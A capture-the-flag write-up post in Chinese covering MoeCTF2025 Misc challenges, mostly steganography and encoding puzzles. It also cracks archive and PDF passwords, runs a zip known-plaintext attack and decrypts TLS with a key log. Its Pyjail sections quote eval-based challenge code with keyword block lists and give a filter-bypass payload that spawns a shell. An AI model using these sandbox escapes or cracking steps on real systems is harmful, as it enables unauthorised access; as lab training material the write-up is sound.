@@ -1,0 +1,636 @@
+<h1>MoeCTF2025 Misc方向wp</h1>
+<div class="post-meta"><span class="chip">解题记录 · MoeCTF / moectf2025</span><span>2026-02-12</span></div>
+<p>西电终端这几天好像出问题了 所以就在本地打了</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=0m1.png" alt="" referrerpolicy="no-referrer"></p>
+<h2><strong>Enchantment</strong></h2>
+<p><strong>题目描述</strong>：题目附件：enchantment.pcapng  <br>哇多么好的附魔啊  <br>你把图片发了出去，但似乎附魔台上的文字有一些不对劲？  <br>注：请将最终结果按单词以\_分离并包上moectf{}提交，忽略大小写  <br><strong>工具</strong>：Wireshark</p>
+<p>附件是 pcapng文件 用 <strong>Wireshark</strong> 打开  <br>筛选http流量 发现有个传png图片的</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=1m1.png" alt="" referrerpolicy="no-referrer"></p>
+<p>把图片导出</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=1m2.png" alt="" referrerpolicy="no-referrer"></p>
+<p>银河文字 翻译一下</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=1m3.png" alt="" referrerpolicy="no-referrer"></p>
+<pre><code>THE FLAG IS BELOW
+NOW YOU HAVE
+MASTERED
+EOCHANTING</code></pre>
+<p>取得flag flag为  <br><code>moectf{NOW_YOU_HAVE_MASTERED_ENCHANTING}</code></p>
+<h2><strong>Encrypted volume</strong></h2>
+<p><strong>题目描述</strong>：题目附件：volume.rar  <br>找到钥匙，解开加密卷！  <br><strong>工具</strong>：010Editor VeraCrypt</p>
+<p>题目附件rar 解压得到两个无后缀文件</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=2m1.png" alt="" referrerpolicy="no-referrer"></p>
+<p>没什么线索 回rar看一看  <br>用 <strong>010Editor</strong> 打开 发现有个png文件</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=2m2.png" alt="" referrerpolicy="no-referrer"></p>
+<p>手动分离一下 是个二维码 扫一下 得到  <br><code>:@(s&lt;"A3F:89x541Ux[&lt;</code></p>
+<p>应该是加密卷 用 <strong>VeraCrypt</strong> 解密  <br>得到txt文件</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=2m3.png" alt="" referrerpolicy="no-referrer"></p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=2m4.png" alt="" referrerpolicy="no-referrer"></p>
+<p>brianfuck <a href="https://wnkit.com/tool/brainfuck-ook-encrypt-decrypt">在线网站</a>解一下</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=2m5.png" alt="" referrerpolicy="no-referrer"></p>
+<p>取得flag flag为  <br><code>moectf{nOW_YoU-h4V3_UNlocKED-VOlumE}</code></p>
+<h2><strong>ez_png</strong></h2>
+<p><strong>题目描述</strong>：题目附件：ez_png.png  <br>这张平平无奇的图片里藏着一个小秘密。  <br>秘密不在颜色中，而在文件的骨骼里。  <br>注意：某些数据段的长短似乎不太协调。  <br><strong>工具</strong>：pngcheck binwalk</p>
+<p>附件是png 根据题目描述 数据段长短不太协调  <br>用 <strong>pngcheck</strong> 查看</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=3m1.png" alt="" referrerpolicy="no-referrer"></p>
+<p>IDAT块有两个没填满的 可疑的是38字节的  <br><strong>binwalk</strong> 分离一下</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=3m3.png" alt="" referrerpolicy="no-referrer"></p>
+<p>打开分离出来的文件找</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=3m4.png" alt="" referrerpolicy="no-referrer"></p>
+<p>复制 取得flag flag为  <br><code>moectf{h1DdEn_P4YlOaD_IN-Id4T}</code></p>
+<h2><strong>ez_ssl</strong></h2>
+<p><strong>题目描述</strong>：题目附件：ez_ssl.pcapng  <br>zero6six 在网页内上传了一份秘密文件。望着浏览器提示的“连接安全，信息不会外泄”，他觉得万无一失。  <br>但与此同时，他的浏览器却悄悄上传了另一份文件。  <br>现在把他电脑的抓包记录给你，你能破解他的秘密吗？  <br><strong>工具</strong>：Wireshark ARCHPR</p>
+<p>附件是pacpng文件 <strong>Wireshark</strong> 打开  <br>根据题目描述 上传文件 要用POST 筛选一下</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=4m1.png" alt="" referrerpolicy="no-referrer"></p>
+<p>追踪http流</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=4m2.png" alt="" referrerpolicy="no-referrer"></p>
+<p>上传了一个 ssl.log文件 根据题目 这就是我们要的文件 整出来  <br>有了这个文件 我们就可以看到http的明文</p>
+<pre><code>CLIENT_RANDOM 5cc9d58e7bf7268c8c7ca13915b43530206bc57523a3dc06420f47291081bf70 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4
+CLIENT_RANDOM 523878d7689e894823485b8f32727c779f8605866423eab6f4cc16c9df1cfb33 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4
+CLIENT_RANDOM ccfba4dd12e374afd300f296b691e12b70f9d5f8be0458782887763c8a54626e 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4
+CLIENT_RANDOM c8e817f2efcee3be9290aa075919f50f329be997b124487d02a1850e48c4292d 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4</code></pre>
+<p>把上面的文件在TLS导入</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=4m3.png" alt="" referrerpolicy="no-referrer"></p>
+<p>发现这一条流量</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=4m4.png" alt="" referrerpolicy="no-referrer"></p>
+<p>追踪http流 上传的是个压缩包 提取出来</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=4m5.png" alt="" referrerpolicy="no-referrer"></p>
+<p>加密了 下面的注释说是7位纯数字  <br><strong>ARCHPR</strong> 爆破</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=4m6.png" alt="" referrerpolicy="no-referrer"></p>
+<p>出来了 爆破了好久......  <br>密码6921682 解压</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=4m7.png" alt="" referrerpolicy="no-referrer"></p>
+<p>ook加密 <a href="https://wnkit.com/tool/brainfuck-ook-encrypt-decrypt">在线网站</a>解密</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=4m8.png" alt="" referrerpolicy="no-referrer"></p>
+<p>复制 取得flag flag为  <br><code>moectf{upI0@d-l0G_TO-DeCrYPT_uploAD}</code></p>
+<h2><strong>Rush</strong></h2>
+<p><strong>题目描述</strong>：题目附件：rush.gif  <br>“冲刺，冲刺！”你正走在路上，耳边传来这样的声音，还没反应过来，就被撞倒了。  <br>你费劲地爬起来，好像看到了什么信息，回过神来那人早已扬长而去，那我缺的这个道歉这块？  <br>~~上述文案纯属看图说话，玩个梗，无恶意~~  <br><strong>工具</strong>：Stegsolve QR_Research</p>
+<p>附件gif 打开看看 看见有个二维码  <br><strong>Stegsolve</strong> 逐帧读取gif</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=5m1.png" alt="" referrerpolicy="no-referrer"></p>
+<p>缺个定位符的二维码 先试试直接扫 不行再补  <br><strong>QR_Research</strong> 扫码</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=5m2.png" alt="" referrerpolicy="no-referrer"></p>
+<p>直接出来了</p>
+<p>复制 取得flag flag为  <br><code>moectf{QR_C0d3s_feATUR3_eRror_c0RRECt10N}</code></p>
+<h2><strong>SSTV</strong></h2>
+<p><strong>题目描述</strong>：题目附件：sstv.wav  <br>识别并解码附件中使用的特殊通信协议，以获取隐藏信息。  <br><strong>工具</strong>：mmsstv</p>
+<p>给的wav音频 听一下 sstv的电波声  <br>直接打开 <strong>mmsstv</strong> 听就行</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=5m3.png" alt="" referrerpolicy="no-referrer"></p>
+<p>取得flag flag为  <br><code>moectf{d3codiNG_SStV_reQu1REs-PATI3nC3}</code></p>
+<h2><strong>WebRepo</strong></h2>
+<p><strong>题目描述</strong>：题目附件：WebRepo.webp  <br>这都是什么稀奇古怪的格式！？  <br><strong>工具</strong>：QR_Research binwalk git</p>
+<p>给的一个webp图片 是个二维码 <strong>QR_Research</strong> 扫一下</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=6m1.png" alt="" referrerpolicy="no-referrer"></p>
+<p>得到hint  <br><code>Flag is not here, but I can give you a hint: Use binwalk.</code></p>
+<p>按他的来 <strong>binwalk</strong> 一下</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=6m2.png" alt="" referrerpolicy="no-referrer"></p>
+<p>7z压缩包 提取出来</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=6m3.png" alt="" referrerpolicy="no-referrer"></p>
+<p><code>.git</code> 用git指令交互一下  <br><code>git log</code> 查看历史提交记录</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=6m4.png" alt="" referrerpolicy="no-referrer"></p>
+<p>有个flag <code>git show 249ff41401736165cd4514cee7afcd31ecfe7d09</code>  <br>看看它干嘛了</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=6m5.png" alt="" referrerpolicy="no-referrer"></p>
+<p>它放了个 flag.txt 而且git把内容也打印出来了  <br>复制 取得flag flag为  <br><code>moectf{B1NwA1K_ANd_g1t_R3seT-MaG1C}</code></p>
+<h2><strong>weird_photo</strong></h2>
+<p><strong>题目描述</strong>：题目附件: photo.png  <br>FLAG就在图中。  <br>什么，你说你看不见 FLAG？注意 CRC！  <br><strong>工具</strong>：010Editor</p>
+<p>附件是个png图片 根据题目描述“CRC” 猜测宽高被改  <br>用 <strong>010Editor</strong> 打开 把高改大点</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=7m1.png" alt="" referrerpolicy="no-referrer"></p>
+<p>保存 打开图片</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=7m2.png" alt="" referrerpolicy="no-referrer"></p>
+<p>取得flag flag为  <br><code>moectf{Image_Height_Restored}</code></p>
+<h2><strong>哈基米难没露躲</strong></h2>
+<p><strong>题目描述</strong>：题目附件：hachimigo.zip  <br>出题人哈基米音乐听多了(bushi  <br><strong>工具</strong>：010Editor</p>
+<p>附件zip 解压一下</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=8m1.png" alt="" referrerpolicy="no-referrer"></p>
+<p>哈基米说是 应该是什么加密吧 搜一下  <br>搜了几个在线网站 虽然都是哈基米加密 但是解不开  <br>找找还有没有信息 <strong>010Editor</strong> 看看原来的压缩包</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=8m2.png" alt="" referrerpolicy="no-referrer"></p>
+<p>有hint  <br><code>hint{https://lhlnb.top/hajimi/base64}</code></p>
+<p>访问这个网址</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=8m3.png" alt="" referrerpolicy="no-referrer"></p>
+<p>给了个fakeflag</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=8m4.png" alt="" referrerpolicy="no-referrer"></p>
+<p>写wp复制过来就蹦出来了 嗯零宽字符隐写 意外之喜说是  <br>拿去<a href="https://tool.bfw.wiki/tool/1695021695027599.html">在线网站</a>解密</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=8m5.png" alt="" referrerpolicy="no-referrer"></p>
+<p>复制 取得flag flag为  <br><code>moectf{1b8956b9-a423-4101-a1bd-65be33682c82}</code></p>
+<hr>
+<p>做到这网站复活了</p>
+<h2><strong>Misc入门指北</strong></h2>
+<p><strong>题目描述</strong>：题目附件：miscru<em>men_zhi_bei</em>.pdf<br>欢迎来到misc的世界^\_^  <br>想要的flag就藏在入门指北里面，快去找找看吧~  <br><strong>工具</strong>：</p>
+<p>附件pdf 先考虑白色字体隐写  <br>打开 全选 复制到记事本</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=9m1.png" alt="" referrerpolicy="no-referrer"></p>
+<p>发现flag 复制 取得flag flag为  <br><code>moectf{We1c0m3_7o_tH3_w0R1d_0f_m1sc3111aN3ous!!</code></p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=9m2.png" alt="" referrerpolicy="no-referrer"></p>
+<h2><strong>ez_LSB</strong></h2>
+<p><strong>题目描述</strong>：题目附件：xidian.png  <br>这是一张普通的图片，但是一个个像素看过去似乎有些蹊跷？  <br><strong>工具</strong>：zsteg Cyberchef</p>
+<p>png图片 根据题目 LSB隐写  <br>用 <strong>zsteg</strong> 查看</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=10m1.png" alt="" referrerpolicy="no-referrer"></p>
+<p>找到</p>
+<pre><code>&quot;The flag is: bW9lY3Rme0xTQl8xc19zMF8xbnQzcmVzdDFuZyEhc2o5d2R9&quot;</code></pre>
+<p>像base64 拿去 解密</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=10m2.png" alt="" referrerpolicy="no-referrer"></p>
+<p>复制 取得flag flag为<br><code>moectf{LSB_1s_s0_1nt3rest1ng!!sj9wd}</code></p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=10m3.png" alt="" referrerpolicy="no-referrer"></p>
+<h2><strong>捂住一只耳</strong></h2>
+<p><strong>题目描述</strong>：题目附件：粒子艺术.wav  <br>一只手捂住耳朵 另一只手打开音乐 似乎听到了不一样的声音  <br>flag 形式以moectf{}包裹提交，忽略大小写  <br><strong>工具</strong>：Audacity Cyberchef</p>
+<p>附件wav音频 根据题目描述 猜测声道隐写  <br>用 <strong>Audacity</strong> 打开</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=11m1.png" alt="" referrerpolicy="no-referrer"></p>
+<p>左声道发现莫斯密码 记下来</p>
+<pre><code>..-. .-.. .- --. .. ... ---... .... .- .-.. ..-. ..--.- .-. .- -.. .. --- ..--.- .. -. ..--.- -..- -.. ..-</code></pre>
+<p><strong>Cychef</strong> 解密</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=11m2.png" alt="" referrerpolicy="no-referrer"></p>
+<p>取得flag flag为  <br><code>moectf{HALF_RADIO_IN_XDU}</code></p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=11m3.png" alt="" referrerpolicy="no-referrer"></p>
+<h2><strong>ez\_锟斤拷????</strong></h2>
+<p><strong>题目描述</strong>：题目附件：flag.txt  <br>E=hv在记事本里写下了一些神秘字符，但是经过一通保存另存为的迷之操作之后文本文件里的东西全变成了乱码  <br>现在我把这个文件给你，请你帮助hv找回文件的秘密吧！  <br>请把得到的flag转换成半角字符上交  <br>hint：此题解法与锟斤拷有关  <br><strong>工具</strong>：Python</p>
+<p>附件txt 看看</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=12m1.png" alt="" referrerpolicy="no-referrer"></p>
+<p>根据hint 搜搜锟斤拷</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=12m2.png" alt="" referrerpolicy="no-referrer"></p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=12m3.png" alt="" referrerpolicy="no-referrer"></p>
+<p>可以知道 锟斤拷是GBK错误的把Unicode的占位符当做汉字编码的结果  <br>所以我们只需要把乱码逆GBK 再用UTF-8编码即可  <br>编写脚本</p>
+<pre><code># 锟斤拷乱码修复
+
+def fix(file):
+    # 读取乱码文件的内容
+    with open(file, &quot;r&quot;, encoding=&quot;utf-8&quot;, errors=&quot;ignore&quot;) as f:
+        data = f.read()
+
+    # 当作 GBK 解码成字节 再用 UTF-8 解码
+    fixed = data.encode(&quot;gbk&quot;, errors=&quot;ignore&quot;).decode(&quot;utf-8&quot;, errors=&quot;ignore&quot;)
+
+    with open(&quot;fixed.txt&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:
+        f.write(fixed)
+
+    print(&quot;修复完成 修复文件存储在 fixed.txt&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    file_name=&quot;flag.txt&quot;
+    fix(file_name)</code></pre>
+<p>运行</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=12m4.png" alt="" referrerpolicy="no-referrer"></p>
+<pre><code>ｍｏｅｃｔｆ｛ＥｎＣ０ｄ１ｉｎｇ＿ｇｂＫ＿＠ｎＤ＿Ｕｔｆ＿８＿１ｓ＿４ｕｎ！！ｅｗｗｗｗ｝恭喜你得到弗拉格后面全昔斤拷锟斤拷锟斤拷</code></pre>
+<p>把这段全角字符换成半角字符  <br>这里写了个脚本方便复用</p>
+<pre><code># 全角半角转换
+
+def full_to_half(text):
+    &quot;&quot;&quot;
+    全角转半角
+    :param text:
+    :return:
+    &quot;&quot;&quot;
+    result = []
+    for char in text:
+        code = ord(char)
+        if code == 0x3000:
+            code = 0x0020
+        elif 0xFF01 &lt;= code &lt;= 0xFF5E:
+            code -= 0xFEE0
+        elif 0x2010 &lt;= code &lt;= 0x2015:
+            code = 0x002D
+        result.append(chr(code))
+    return &#x27;&#x27;.join(result)
+
+
+def half_to_full(text):
+    &quot;&quot;&quot;
+    半角转全角
+    :param text:
+    :return:
+    &quot;&quot;&quot;
+    result = []
+    for char in text:
+        code = ord(char)
+        if code == 0x0020:
+            code = 0x3000
+        elif 0x0021 &lt;= code &lt;= 0x007E:
+            code += 0xFEE0
+        elif code == 0x002D:
+            code = 0x2014
+        result.append(chr(code))
+    return &#x27;&#x27;.join(result)
+
+
+if __name__ == &quot;__main__&quot;:
+
+    # 全-&gt;半
+    full_text = &quot;ｍｏｅｃｔｆ｛ＥｎＣ０ｄ１ｉｎｇ＿ｇｂＫ＿＠ｎＤ＿Ｕｔｆ＿８＿１ｓ＿４ｕｎ！！ｅｗｗｗｗ｝&quot;
+    print(full_to_half(full_text))
+
+    # 半-&gt;全
+    half_text = &quot;&quot;
+    print(half_to_full(half_text))</code></pre>
+<p>运行</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=12m5.png" alt="" referrerpolicy="no-referrer"></p>
+<p>复制 取得flag flag为  <br><code>moectf{EnC0d1ing_gbK_@nD_Utf_8_1s_4un!!ewwww}</code></p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=12m6.png" alt="" referrerpolicy="no-referrer"></p>
+<h2><strong>encrypted_pdf</strong></h2>
+<p><strong>题目描述</strong>：题目附件：不知道写什么.pdf diary.txt  <br>这年头，啥都能带个密码，pdf也不例外。  <br>难道有密码就能拦住我堂堂misc手吗？？不可能的！  <br><strong>工具</strong>：pdfcrack</p>
+<p>根据题目描述 pdf加密 有个txt文件 先看看</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=13m1.png" alt="" referrerpolicy="no-referrer"></p>
+<p>得知是弱密码 可以进行爆破  <br>这里用 <strong>pdfcrack</strong> 配合 <strong>rockyou</strong> 爆破</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=13m2.png" alt="" referrerpolicy="no-referrer"></p>
+<p>得到密码 qwe123 打开pdf</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=13m3.png" alt="" referrerpolicy="no-referrer"></p>
+<p>何意味</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=13m4.png" alt="" referrerpolicy="no-referrer"></p>
+<p>哦哦下面还有东西 我还以为又是什么奇奇怪怪的编码</p>
+<p>Ctrl+a 已经发现隐写文本了 复制到记事本观看即可</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=13m5.png" alt="" referrerpolicy="no-referrer"></p>
+<p>复制 取得flag flag为  <br><code>moectf{Pdf_1s_r3a1ly_c0lor4ul!!ihdw}</code></p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=13m6.png" alt="" referrerpolicy="no-referrer"></p>
+<h2><strong>万里挑一</strong></h2>
+<p><strong>题目描述</strong>：题目附件：hint.txt lock.zip password.zip  <br>要想冲破封锁，寻得真谛，须从万把钥匙中找出唯一的答案  <br><strong>工具</strong>：Python ARCHPR 010Editor bkcrack</p>
+<p>有hint 先看hint</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=14m1.png" alt="" referrerpolicy="no-referrer"></p>
+<p>在这10000个档案中，只有一个密码可以打开锁</p>
+<p>发现passwor.zip可以直接解压 看看内容</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=14m2.png" alt="" referrerpolicy="no-referrer"></p>
+<p>里面还是压缩包 看看</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=14m3.png" alt="" referrerpolicy="no-referrer"></p>
+<p>666套娃说是  <br>应该是要解压所有压缩包 组成字典去爆破lock.zip  <br>ai写一个脚本 作用是解压所有压缩包并拼接文本生成字典</p>
+<pre><code>import os
+import zipfile
+
+
+def extract_all_and_merge_text(start_path, output_file=&quot;merged_dict.txt&quot;):
+    all_text_lines = []
+    processed = set()
+    to_process = [(start_path, &quot;&quot;)]
+
+    while to_process:
+        current_dir, rel_path = to_process.pop(0)
+        try:
+            items = os.listdir(current_dir)
+        except PermissionError:
+            continue
+
+        for item in items:
+            item_path = os.path.join(current_dir, item)
+            if os.path.isdir(item_path):
+                to_process.append((item_path, os.path.join(rel_path, item)))
+            elif os.path.isfile(item_path):
+                if item_path in processed:
+                    continue
+                processed.add(item_path)
+
+                if item.lower().endswith(&#x27;.zip&#x27;):
+                    try:
+                        extract_dir = item_path + &quot;_unzipped&quot;
+                        os.makedirs(extract_dir, exist_ok=True)
+                        with zipfile.ZipFile(item_path, &#x27;r&#x27;) as zf:
+                            zf.extractall(extract_dir)
+                        to_process.append((extract_dir, os.path.join(rel_path, item)))
+                    except Exception as e:
+                        print(f&quot;解压失败 {item_path}: {e}&quot;)
+
+                elif item.lower().endswith(&#x27;.txt&#x27;) or &#x27;.&#x27; not in item:
+                    try:
+                        with open(item_path, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) as f:
+                            content = f.read().strip()
+                            if content:
+                                all_text_lines.append(content)
+                                print(f&quot;提取文本: {item_path}&quot;)
+                    except Exception as e:
+                        print(f&quot;读取文本失败 {item_path}: {e}&quot;)
+
+    with open(output_file, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as f:
+        f.write(&#x27;\n\n&#x27;.join(all_text_lines))
+
+    print(f&quot;完成！共提取了 {len(all_text_lines)} 个文本片段，保存至 {output_file}&quot;)
+
+
+if __name__ == &quot;__main__&quot;:
+    # 修改为当前目录
+    input_folder = &quot;.&quot;  # 这里改成 &quot;.&quot; 表示当前目录
+    output_file = &quot;merged_dict.txt&quot;
+    extract_all_and_merge_text(input_folder, output_file)</code></pre>
+<p>运行 这里运行时间还挺长的  <br>打开生成的txt文件检查 发现多了前缀 <strong>The password is:</strong> 把它替换为空即可</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=14m4.png" alt="" referrerpolicy="no-referrer"></p>
+<p>打开 <strong>ARCHPR</strong> 导入刚刚的字典 爆破即可</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=14m5.png" alt="" referrerpolicy="no-referrer"></p>
+<p>得到密码 a296a5ec1385f394e8cb 解压</p>
+<p>得到flag.zip 内容如下</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=14m6.png" alt="" referrerpolicy="no-referrer"></p>
+<p>明文攻击说是 但是内容是个exe文件 分析下exe文件的结构吧  <br>用 <strong>010Editor</strong> 随便打开个exe文件看看</p>
+<p>明文攻击要至少12个字节 exe的文件头 <code>4D 5A</code> 不够使  <br>不过看到一段这样的文本</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=14m7.png" alt="" referrerpolicy="no-referrer"></p>
+<p>查询一下这段文本是不是每一个exe文件都有</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=14m8.png" alt="" referrerpolicy="no-referrer"></p>
+<p>ok可以用 数一下偏移量为78个字节</p>
+<pre><code>546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F6465</code></pre>
+<p>用 <strong>bkcrack</strong> 攻击</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=14m9.png" alt="" referrerpolicy="no-referrer"></p>
+<p>拿到三个密钥 <code>eec878a3</code> <code>6808e48f</code> <code>3aa41bd8</code>  <br>提取 flag.txt</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=14m10.png" alt="" referrerpolicy="no-referrer"></p>
+<p>打开 flag.txt</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=14m11.png" alt="" referrerpolicy="no-referrer"></p>
+<p>复制 取得flag flag为  <br><code>moectf{Y0u_h4v3_cho5en_7h3_r1ght_z1pf1le!!uysdgfsad}</code></p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=14m12.png" alt="" referrerpolicy="no-referrer"></p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=15m1.png" alt="" referrerpolicy="no-referrer"></p>
+<h2><strong>Pyjail 0</strong></h2>
+<p><strong>题目描述</strong>:A simple reader (所以严格来说这题不算 Pyjail)  <br>你可以使用 netcat 或 pwntools（参考二进制漏洞审计入门指北）连接到本题和后续 Pyjail 题的环境。  <br>关于验证码，示例：Please enter the reverse of 'GZUUAOIS' to continue: SIOAUUZG  <br>至于 flag 的位置？你可以参考 Web 第十二章（  <br><strong>工具</strong>：WebSocket</p>
+<p>就是开环境麻烦点 主机上 <strong>WebSocket</strong> 开完wsl半天连不上  <br>最后用 0.0.0.0 + 主机ip 连上了</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=15m1.png" alt="" referrerpolicy="no-referrer"></p>
+<p>大致就是让你输随机数的逆序 然后猜flag的位置  <br>根据题目描述 看web十二章的wp 发现是env  <br>也就是 /proc/self/environ</p>
+<p>复制 取得flag flag为  <br><code>moectf{adba1313-7797-c779-5bce-04ad7a7307b9}</code></p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=15m2.png" alt="" referrerpolicy="no-referrer"></p>
+<h2><strong>Pyjail 1</strong></h2>
+<p><strong>题目描述</strong>flag 位置在 /tmp 下  <br>其他信息见 Pyjail 0  <br><strong>工具</strong>：Python WebSocket</p>
+<p>感觉Pyjail就是misc版的SSTI......  <br>等于是给SSTI补课了</p>
+<p>拿附件 源码如下</p>
+<pre><code>def chall():
+    user_input = input(&quot;Give me your code: &quot;)
+
+    # 过滤关键字
+    forbidden_keywords = [&#x27;import&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;open&#x27;, &#x27;file&#x27;]
+    for keyword in forbidden_keywords:
+        if keyword in user_input:
+            print(f&quot;Forbidden keyword detected: {keyword}&quot;)
+            return
+
+    result = eval(user_input)</code></pre>
+<p>这里用 <code>eval()</code> 执行输入  <br>过滤了 <code>import</code> <code>eval</code> <code>exec</code> <code>open</code> <code>file</code></p>
+<p>想拿shell 可以用os里的system('sh')  <br>不过这里 import 被ban了 可以用拼接绕过</p>
+<p><code>__builtins__.__dict__['__imp' + 'ort__']('os').system('sh')</code></p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=16m1.png" alt="" referrerpolicy="no-referrer"></p>
+<p>这里拿到shell看见没反应了 还以为卡了  <br>然后又犯蠢没劲目录就cat 我是人机  <br>不过总归是拿到了 复制 取得flag flag为  <br><code>moectf{0d373ad5-5f18-2c69-6b68-4c913a318ac3}</code></p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=16m2.png" alt="" referrerpolicy="no-referrer"></p>
+<h2><strong>Pyjail 2</strong></h2>
+<p><strong>题目描述</strong>flag 位置在 /tmp 下  <br>其他信息见 Pyjail 0  <br><strong>工具</strong>：Python WebSocket</p>
+<p>拿附件 源码如下</p>
+<pre><code>def chall():
+    user_input = input(&quot;Give me your code: &quot;)
+
+    # 过滤关键字
+    forbidden_keywords = [&#x27;import&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;open&#x27;, &#x27;file&#x27;]
+    for keyword in forbidden_keywords:
+        if keyword in user_input:
+            print(f&quot;Forbidden keyword detected: {keyword}&quot;)
+            return
+
+    # 过滤特殊字符
+    forbidden_chars = [&#x27;.&#x27;, &#x27;_&#x27;, &#x27;[&#x27;, &#x27;]&#x27;, &quot;&#x27;&quot;, &#x27;&quot;&#x27;]
+    for char in forbidden_chars:
+        if char in user_input:
+            print(f&quot;Forbidden character detected: {char}&quot;)
+            return
+
+    result = eval(user_input)</code></pre>
